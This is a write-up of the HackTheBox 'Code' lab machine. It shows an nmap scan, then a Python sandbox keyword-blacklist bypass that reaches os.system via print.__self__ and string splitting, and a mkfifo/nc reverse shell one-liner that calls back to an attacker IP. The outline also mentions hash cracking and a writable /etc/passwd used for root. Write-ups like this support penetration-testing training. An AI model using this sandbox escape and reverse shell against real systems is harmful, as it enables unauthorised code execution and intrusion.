---
title: Hackthebox code machine write up 
categories: PENTEST 
image: null
published: true
---


H3ll0 pwn3rs !!!


Here is a writeup for Hackthebox `code machine`


Hackthebox `Code box `  is an easy linux machine.

We exploit the machine as follow:
- Exploit RCE in python sanbox
- Make reverse shell
- Found databse file
- retrive Martin password in md5 hash
- crack the password with crackstation
- connect to ssh with martin credential
- use  linpeas to enum
- /etc/passwd is writable by martin
- create new-user root user
- switch to new-user and get access to root


# Nmap scan
```
sudo nmap -A -T4 --min-rate 1000 10.10.11.62                                                                             
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-04-21 22:29 WAT                                                             
Nmap scan report for 10.10.11.62                                                                                               
Host is up (0.76s latency).                                                                                                    
Not shown: 998 closed tcp ports (reset)                                                                                        
PORT     STATE SERVICE VERSION                                                                                                 
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0)                                           
| ssh-hostkey:                                                                                                                 
|   3072 b5:b9:7c:c4:50:32:95:bc:c2:65:17:df:51:a2:7a:bd (RSA)                                                                 
|   256 94:b5:25:54:9b:68:af:be:40:e1:1d:a8:6b:85:0d:01 (ECDSA)                                                                |_  256 12:8c:dc:97:ad:86:00:b4:88:e2:29:cf:69:b5:65:96 (ED25519)                                                              
5000/tcp open  http    Gunicorn 20.0.4                                                                                         
|_http-title: Python Code Editor                                                                                               
|_http-server-header: gunicorn/20.0.4                                                                                          
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).                            
TCP/IP fingerprint:

```

### Found two open port 22 for ssh and 5000 for  http 


When we navigate to http://10.10.11.62:5000/, we found web page that let you run python code.
I try injection in login and singup form by not success.
After some try and error i decide to focus on python code execution feature.
The idea here is to bypass sandbox and make code  code execution.
you can try to play with it to understand it better.
After spend some time, i knew that we deal with python sanbox, some keywork are blacklisted.
keyword like those:  ` system, exec, builtins, os , popen, read,...`. 

How to bypass this sandbox??? 
Below are  the steps:
- found a way to access buitins: print.__self__
- from buitins, access to __import__ to import os: `.__dict__.get('imp' +ort')('o'+'s')
- from os, call system to exec code on the remote server: .__getattribute__("sys" +"tem")
- exec your command: ("command")

The payload :

```python
print.__self__.__dict__.get('__imp' +'ort__')('o'+'s').__getattribute__("sys"+"tem")("command")"
```


I run nc in listen mode on my local machine
``nc -lvp 4444``

and send this payload:
```python3
print.__self__.__dict__.get('__imp' +'ort__')('o'+'s').__getattribute__("sys"+"tem")("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.16.79 4444 >/tmp/f")


# Bouummmm ! get reverse shell 

![recon](/assets/hackthebox/get_reverse_shell.png)
